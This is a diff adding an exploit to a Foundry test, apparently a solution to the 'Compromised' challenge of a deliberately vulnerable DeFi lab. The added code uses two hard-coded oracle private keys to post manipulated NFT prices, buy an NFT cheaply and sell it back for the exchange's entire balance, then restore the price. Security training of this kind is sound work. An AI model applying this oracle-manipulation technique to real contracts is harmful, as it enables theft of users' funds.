@@ -76,6 +76,43 @@ contract Compromised is Test {
         /**
          * EXPLOIT START *
          */
+        console.log("Exchange balance before exploit: ", address(exchange).balance);
+
+        address oracle1 = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
+        console.log("Oracle1 address: ", oracle1);
+
+        address oracle2 = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);
+        console.log("Oracle2 address: ", oracle2);
+
+        uint256 initialPrice = trustfulOracle.getMedianPrice("DVNFT");
+
+        vm.prank(oracle1);
+        trustfulOracle.postPrice("DVNFT", 0.01 ether);
+
+        vm.prank(oracle2);
+        trustfulOracle.postPrice("DVNFT", 0.01 ether);
+
+        vm.prank(attacker);
+        uint256 tokenId = exchange.buyOne{value: 0.01 ether}();
+
+        vm.prank(oracle1);
+        trustfulOracle.postPrice("DVNFT", address(exchange).balance);
+
+        vm.prank(oracle2);
+        trustfulOracle.postPrice("DVNFT", address(exchange).balance);
+
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        vm.stopPrank();
+
+        vm.prank(oracle1);
+        trustfulOracle.postPrice("DVNFT", initialPrice);
+
+        vm.prank(oracle2);
+        trustfulOracle.postPrice("DVNFT", initialPrice);
+
+        console.log("Exchange balance after exploit: ", address(exchange).balance);
 
         /**
          * EXPLOIT END *
